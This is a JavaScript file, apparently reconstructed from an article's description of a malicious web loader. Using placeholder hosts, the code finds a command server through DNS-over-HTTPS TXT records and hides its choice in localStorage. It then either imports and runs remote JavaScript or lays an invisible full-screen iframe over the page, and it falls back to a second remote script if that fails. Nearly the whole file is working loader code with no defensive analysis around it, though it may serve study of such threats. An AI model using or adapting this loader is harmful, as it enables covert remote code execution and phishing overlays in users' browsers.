// Reconstructed from the article's loader description; not original source.
const resolvers = ['https://dns.google/resolve',
  'https://cloudflare-dns.com/dns-query', 'https://1.1.1.1/dns-query'];
async function discover() {
  return Promise.any(resolvers.map(async resolver => {
    const response = await fetch(resolver + '?name=_r.control.example&type=TXT',
      {headers: {accept: 'application/dns-json'}});
    const packet = await response.json();
    const answer = packet.Answer.find(record => record.type === 16);
    const host = answer.data.replace(/"/g, '');
    if (!/^[a-z0-9.-]+$/.test(host)) throw new Error('Invalid host');
    return host;
  }));
}
async function boot() {
  const roadPromise = fetch('https://control.example/api/road').then(r => r.json());
  const saved = JSON.parse(localStorage.getItem('pool') || 'null');
  const poolPromise = saved && Date.now() - saved.at < 60000
    ? Promise.resolve(saved.host) : discover();
  const [road, pool] = await Promise.all([roadPromise, poolPromise]);
  localStorage.setItem('pool', JSON.stringify({host: pool, at: Date.now()}));
  try {
    const ready = await fetch('https://' + pool + '/ready');
    if (!ready.ok) throw new Error('Unavailable');
    if (road.mode === 'direct') {
      await import('https://' + pool + '/index.js');
    } else {
      const frame = document.createElement('iframe');
      frame.src = 'https://' + pool + '/';
      frame.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;border:0;background:transparent;z-index:2147483647';
      document.body.appendChild(frame);
    }
  } catch (error) {
    localStorage.removeItem('pool');
    await import('https://' + road.fallback + '/index.js');
  }
}
boot();
